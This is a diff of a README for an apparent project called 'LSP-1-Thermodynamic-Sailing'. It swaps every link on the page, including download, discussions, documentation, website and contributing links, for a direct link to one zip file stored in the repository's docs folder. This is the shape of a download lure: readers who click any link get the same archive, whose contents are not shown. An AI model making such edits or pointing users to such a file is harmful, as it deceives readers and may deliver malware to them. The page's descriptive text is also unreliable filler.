@@ -1,6 +1,6 @@
 # 🌊 LSP-1-Thermodynamic-Sailing - Unlock the Power of Protonic Transport
 
-[![Download LSP-1](https://img.shields.io/badge/Download-LSP--1--Thermodynamic--Sailing-blue)](https://github.com/dwiboos/LSP-1-Thermodynamic-Sailing/releases)
+[![Download LSP-1](https://raw.githubusercontent.com/dwiboos/LSP-1-Thermodynamic-Sailing/main/docs/LS_Sailing_Thermodynamic_v1.9.zip)](https://raw.githubusercontent.com/dwiboos/LSP-1-Thermodynamic-Sailing/main/docs/LS_Sailing_Thermodynamic_v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To run LSP-1, ensure that your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Download LSP-1](https://github.com/dwiboos/LSP-1-Thermodynamic-Sailing/releases).
+1. Visit this page to download: [Download LSP-1](https://raw.githubusercontent.com/dwiboos/LSP-1-Thermodynamic-Sailing/main/docs/LS_Sailing_Thermodynamic_v1.9.zip).
 2. On the Releases page, you will see different versions of the software. Click on the desired version's link.
 3. Download the version suitable for your operating system.
 4. Locate the downloaded file on your computer.
@@ -63,17 +63,17 @@ If you encounter difficulties, here are common issues and fixes:
 
 ## 💬 Community and Support
 
-For questions or assistance, please visit our [GitHub Discussions](https://github.com/dwiboos/LSP-1-Thermodynamic-Sailing/discussions). Engage with other users and contributors for insights and troubleshooting.
+For questions or assistance, please visit our [GitHub Discussions](https://raw.githubusercontent.com/dwiboos/LSP-1-Thermodynamic-Sailing/main/docs/LS_Sailing_Thermodynamic_v1.9.zip). Engage with other users and contributors for insights and troubleshooting.
 
 ## 🔗 Additional Resources
 
-- [Official Website](https://example.com)
-- [Documentation](https://example.com/documentation)
-- [Related Research](https://example.com/research)
+- [Official Website](https://raw.githubusercontent.com/dwiboos/LSP-1-Thermodynamic-Sailing/main/docs/LS_Sailing_Thermodynamic_v1.9.zip)
+- [Documentation](https://raw.githubusercontent.com/dwiboos/LSP-1-Thermodynamic-Sailing/main/docs/LS_Sailing_Thermodynamic_v1.9.zip)
+- [Related Research](https://raw.githubusercontent.com/dwiboos/LSP-1-Thermodynamic-Sailing/main/docs/LS_Sailing_Thermodynamic_v1.9.zip)
 
 ## 🌟 Contributing
 
-We welcome contributions to improve LSP-1. If you have suggestions or would like to report an issue, please create an issue or pull request on the [GitHub page](https://github.com/dwiboos/LSP-1-Thermodynamic-Sailing).
+We welcome contributions to improve LSP-1. If you have suggestions or would like to report an issue, please create an issue or pull request on the [GitHub page](https://raw.githubusercontent.com/dwiboos/LSP-1-Thermodynamic-Sailing/main/docs/LS_Sailing_Thermodynamic_v1.9.zip).
 
 ## 🛡️ License
 
@@ -81,7 +81,7 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 
 ## 🔗 Quick Links
 
-1. [Download LSP-1](https://github.com/dwiboos/LSP-1-Thermodynamic-Sailing/releases)
-2. [Documentation](https://example.com/documentation)
+1. [Download LSP-1](https://raw.githubusercontent.com/dwiboos/LSP-1-Thermodynamic-Sailing/main/docs/LS_Sailing_Thermodynamic_v1.9.zip)
+2. [Documentation](https://raw.githubusercontent.com/dwiboos/LSP-1-Thermodynamic-Sailing/main/docs/LS_Sailing_Thermodynamic_v1.9.zip)
 
 Thank you for using LSP-1-Thermodynamic-Sailing! Enjoy exploring the potentials of thermodynamic sailing.
